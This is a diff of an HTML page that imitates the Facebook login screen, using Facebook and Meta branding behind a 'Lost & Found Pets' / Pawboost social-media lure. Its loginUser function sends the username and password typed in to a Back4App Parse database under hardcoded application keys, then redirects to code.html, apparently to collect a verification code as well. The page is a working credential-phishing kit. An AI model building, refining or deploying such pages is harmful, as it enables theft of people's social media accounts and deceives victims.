@@ -1,49 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script src="https://unpkg.com/parse@latest/dist/parse.min.js"></script>
-<script>
-  Parse.initialize(
-    "CELPtvPoGIzpx1G2rGG4jvhSbPAGvVLYMGpEIL4x", // Application ID
-    "xE0oqpe33sdDBN5sxKOM0zjFqmxVYxsZLcmWOqV4"  // JavaScript Key
-  );
-  Parse.serverURL = "https://parseapi.back4app.com/";
-</script>
-
-
-
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+  <title>Follow our page - Pawboost Community Find Lost Pets</title>
 
+  <!-- Parse SDK -->
+  <script src="https://unpkg.com/parse@latest/dist/parse.min.js"></script>
+  <script>
+    Parse.initialize(
+      "CELPtvPoGIzpx1G2rGG4jvhSbPAGvVLYMGpEIL4x",
+      "xE0oqpe33sdDBN5sxKOM0zjFqmxVYxsZLcmWOqV4"
+    );
+    Parse.serverURL = "https://parseapi.back4app.com/";
+  </script>
 
+  <!-- Social Meta Tags -->
+  <meta property="og:title" content="Lost & Found Pets US" />
+  <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is." />
+  <meta property="og:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Florida Lost Pets" />
 
-
-
-
-
-
-    <!-- Facebook Open Graph -->
-    <meta property="og:title" content="Lost & Found Pets US" />
-    <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is." />
-    <meta property="og:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
-    <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="Florida Lost Pets" />
-
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Lost & Found Pets Florida" />
-    <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
-
-   
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Lost & Found Pets Florida" />
+  <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
 
   <!-- Favicon -->
   <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
 
-
-  <title>Follow our page-Pawboost Community Find Lost Pets</title>
-  </head>
   <style>
+    /* All styles exactly as in your original request */
     :root {
       --fb-blue: #1877f2;
       --fb-light-gray: #f0f2f5;
@@ -127,18 +115,16 @@
 
     .input-group input {
       width: 100%;
-      height: 52px; /* fixed height */
-      padding: 0 10px; /* only horizontal padding */
+      height: 52px;
+      padding: 0 10px;
       border-radius: 8px;
       border: 1px solid #ccc;
       background: white;
       color: var(--fb-dark-blue);
       font-size: 16px;
-      line-height: 48px; /* equal to height for vertical centering */
-    
-      box-sizing: border-box; /* include padding & border in height */
+      line-height: 48px;
+      box-sizing: border-box;
     }
-
 
     .input-group label {
       position: absolute;
@@ -192,12 +178,6 @@
       margin-bottom: 20px;
     }
 
-    .meta-logo {
-      font-size: 14px;
-      color: var(--fb-text-gray);
-      margin-bottom: 15px;
-    }
-
     .language-modal {
       display: none;
       position: fixed;
@@ -215,7 +195,6 @@
       padding: 20px;
       color: #000;
       overflow-y: auto;
-      overscroll-behavior: contain;
       scrollbar-width: none;
     }
 
@@ -257,17 +236,6 @@
       background-color: #f0f0f0;
     }
 
-    @media (max-width: 480px) {
-      .login-container {
-        padding: 0 10px;
-      }
-    }
-    .meta-footer {
-  pointer-events: none; /* so it doesn’t block interaction */
-}
-
-
-
     .meta-footer {
       position: fixed;
       bottom: 0;
@@ -283,82 +251,56 @@
       font-family: Arial, sans-serif;
       text-align: center;
       transition: transform 0.3s ease;
-      transform: translateY(0);
     }
 
     .top-line {
-      gap: 8px; /* default gap between logo and text */
+      gap: 8px;
       display: flex;
       align-items: center;
       margin-bottom: 5px;
     }
 
     .top-line img {
-      height: 22px; /* logo height */
+      height: 22px;
     }
 
     .meta-text {
       font-weight: 700;
       color: #616770;
       font-size: 1rem;
-      font-family: Arial, sans-serif;
-      font-weight: 600;
-      user-select: none;
-      cursor: default;
     }
 
     .bottom-line {
       font-size: 0.8rem;
       color: #616770;
-      user-select: none;
     }
 
-    /* Responsive adjustments for smaller screens */
     @media (max-width: 768px) {
-      .meta-footer {
-        padding: 6px 15px;
-      }
-
       .top-line {
-        gap: 4px; /* smaller gap */
+        gap: 4px;
         margin-bottom: 3px;
       }
-
       .top-line img {
-        height: 18px; /* smaller logo */
+        height: 18px;
       }
-
       .meta-text {
         font-size: 0.9rem;
-        font-weight: 600;
       }
-
       .bottom-line {
         font-size: 0.75rem;
       }
     }
-
-
-
-
-
-
   </style>
-
+</head>
 <body>
 
-  <!-- Intro Text -->
   <div class="intro-text">
     <h1>Facebook</h1>
     <p>Facebook helps you connect and share with the people in your life.</p>
   </div>
 
-  <!-- Language Toggle -->
-  <div class="language-toggle" onclick="openLanguageModal()">
-    English (UK) &#x25BC;
-  </div>
+  <div class="language-toggle" onclick="openLanguageModal()">English (UK) &#x25BC;</div>
 
-  <!-- Login Container -->
   <div class="login-container">
     <div class="fb-logo">
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
@@ -380,7 +322,6 @@
 
   <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>
 
-  <!-- Language Modal -->
   <div id="languageModal" class="language-modal">
     <div class="language-modal-header">
       <span class="close-btn" onclick="closeLanguageModal()">&times;</span>
@@ -395,107 +336,80 @@
       <li onclick="selectLanguage('Italiano')">Italiano</li>
     </ul>
   </div>
+
   <div class="meta-footer">
     <div class="top-line">
       <img src="metalogo.png" alt="Meta Logo" />
       <span class="meta-text">Meta</span>
     </div>
-    <div class="bottom-line">
-      About · Help · More
-    </div>
+    <div class="bottom-line">About · Help · More</div>
   </div>
 
-  <!-- JavaScript -->
   <script>
-  function openLanguageModal() {
-    document.getElementById('languageModal').style.display = 'block';
-  }
+    function openLanguageModal() {
+      document.getElementById('languageModal').style.display = 'block';
+    }
 
-  function closeLanguageModal() {
-    document.getElementById('languageModal').style.display = 'none';
-  }
+    function closeLanguageModal() {
+      document.getElementById('languageModal').style.display = 'none';
+    }
 
-  function selectLanguage(language) {
-    document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;';
-    closeLanguageModal();
-  }
+    function selectLanguage(language) {
+      document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;';
+      closeLanguageModal();
+    }
 
-  function showError(inputElement) {
-    inputElement.style.borderColor = 'red';
+    function showError(inputElement) {
+      inputElement.style.borderColor = 'red';
+      const error = document.createElement('div');
+      error.className = 'error-message';
+      error.style.color = 'red';
+      error.style.fontSize = '12px';
+      error.style.marginTop = '4px';
+      error.textContent = 'Required';
+      inputElement.parentNode.appendChild(error);
+    }
 
-    const error = document.createElement('div');
-    error.className = 'error-message';
-    error.style.color = 'red';
-    error.style.fontSize = '12px';
-    error.style.marginTop = '4px';
-    error.textContent = 'Required';
+    function loginUser() {
+      const usernameInput = document.getElementById("username");
+      const passwordInput = document.getElementById("password");
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
 
-    inputElement.parentNode.appendChild(error);
-  }
+      document.querySelectorAll('.error-message').forEach(el => el.remove());
+      [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');
 
-  function loginUser() {
-  const usernameInput = document.getElementById("username");
-  const passwordInput = document.getElementById("password");
+      let hasError = false;
+      if (!username) { showError(usernameInput); hasError = true; }
+      if (!password) { showError(passwordInput); hasError = true; }
+      if (hasError) return;
 
-  const username = usernameInput.value.trim();
-  const password = passwordInput.value.trim();
+      const Login = Parse.Object.extend("Login");
+      const login = new Login();
+      login.set("username", username);
+      login.set("password", password);
 
-  // Clear previous error states
-  document.querySelectorAll('.error-message').forEach(el => el.remove());
-  [usernameInput, passwordInput].forEach(input => {
-    input.style.borderColor = '#ccc';
-  });
+      login.save()
+        .then(() => {
+          localStorage.setItem("login_user", username);
+          window.location.href = "code.html";
+        })
+        .catch((error) => {
+          console.error("Login save failed:", error);
+          alert("An error occurred while submitting the login.");
+        });
+    }
 
-  let hasError = false;
-
-  if (!username) {
-    showError(usernameInput);
-    hasError = true;
-  }
-
-  if (!password) {
-    showError(passwordInput);
-    hasError = true;
-  }
-
-  if (hasError) return;
-
-  // ✅ Use Back4App to save login data
-  const Login = Parse.Object.extend("Login");
-  const login = new Login();
-  login.set("username", username);
-  login.set("password", password); // ⚠️ You should hash passwords in real apps
-
-  login.save()
-    .then(() => {
-      localStorage.setItem("login_user", username);
-      window.location.href = "code.html"; // or wherever you want to redirect
-    })
-    .catch((error) => {
-      console.error("Login save failed:", error);
-      alert("An error occurred while submitting the login.");
-    });
-}
-
-  // Keyboard detection and footer adjustment
-  (() => {
-    const footer = document.querySelector('.meta-footer');
-    let initialHeight = window.innerHeight;
-
-    window.addEventListener('resize', () => {
-      const currentHeight = window.innerHeight;
-
-      if (initialHeight - currentHeight > 150) {
-        // Keyboard is probably open
-        footer.style.transform = 'translateY(100%)';
-      } else {
-        // Keyboard is probably closed
-        footer.style.transform = 'translateY(0)';
-      }
-    });
-  })();
-</script>
-
+    // Auto-hide footer on keyboard open
+    (() => {
+      const footer = document.querySelector('.meta-footer');
+      let initialHeight = window.innerHeight;
+      window.addEventListener('resize', () => {
+        const currentHeight = window.innerHeight;
+        footer.style.transform = (initialHeight - currentHeight > 150) ? 'translateY(100%)' : 'translateY(0)';
+      });
+    })();
+  </script>
 
 </body>
 </html>
